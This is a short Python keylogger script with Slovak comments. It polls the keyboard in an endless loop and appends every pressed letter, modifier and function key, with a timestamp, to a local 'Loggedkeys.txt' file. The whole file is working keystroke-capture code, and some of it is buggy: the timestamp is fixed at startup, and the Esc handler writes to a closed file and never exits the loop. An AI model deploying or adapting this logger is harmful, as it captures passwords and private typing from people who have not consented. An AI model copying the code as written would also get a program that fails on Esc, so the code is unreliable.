import keyboard
import os
import datetime

Datum = datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
dlzkaDatumu = int(len(Datum))

FileName = os.path.dirname(os.path.abspath(__file__))
LoggedKeys = os.path.join(FileName, "Loggedkeys.txt")

if not os.path.isfile("Loggedkeys.txt"):
    print("NEBOL Vytvoreny 'Loggedkeys.txt' subor, tak ho script vytvoril :D")
    with open(LoggedKeys, "w") as file:
        file.write("")
else:
    print("Subor existuje :D")
    pass

KeyList = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
           "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
           "u", "v", "w", "x", "y", "z",
           ",", ".", "-", "enter", "&", ";", ":", "<", ">", "_",
           # "esc", je ODKOMENTOVANE pre to, aby sa script dal vypnut esc klavesou
           "alt", "altgr", "ctrl", "shift", "tab", "win", "+",
           "space", "backspace", "delete", "insert", "home", "end", "page up", "page down",
           "up", "down", "left", "right", "print screen", "num lock", "scroll lock", "pause",
           "f1", "f2", "f3", "f4","f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12"]

while True:
    for Klavesa in KeyList:
        if keyboard.is_pressed(Klavesa):
            with open(LoggedKeys, "a") as file:
                file.write("-"*dlzkaDatumu + Datum + "\n" + "-"*dlzkaDatumu)
                file.write(Datum)
                file.write("Pressed key :" + Klavesa + "\n\n")
        elif keyboard.is_pressed("esc"):
            print("bolo stlacene 'ESC' --> Script = Vypnuty !")
            file.write("bolo stlacene 'ESC' --> Script = Vypnuty !")
